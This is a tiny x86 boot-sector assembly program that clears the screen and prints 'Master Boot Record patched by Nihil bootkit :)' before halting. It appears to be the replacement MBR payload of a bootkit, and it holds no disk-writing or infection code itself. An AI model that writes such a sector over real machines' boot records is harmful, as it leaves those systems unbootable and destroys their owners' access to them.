use16
org 0x7c00

cld

call clear
mov ax, cs
mov ds, ax
mov si, msg
call print

print:
    push ax
    cld

    print_next:
        mov al, [si]
        cmp al, 0
        je done
        call print_char
        inc si
        jmp print_next

    print_char:
        mov ah, 0x0e
        int 0x10
        ret

    done:
        jmp $

clear:
    mov ah, 0x07
    mov al, 0x00
    mov bh, 0x02
    mov cx, 0x0000
    mov dx, 0x184f
    int 0x10
    ret

boot:
    pop bp
    int 0x10
    jmp $

msg db "Master Boot Record patched by Nihil bootkit :)", 0

times (510 - ($-$$)) db 0
dw 0xaa55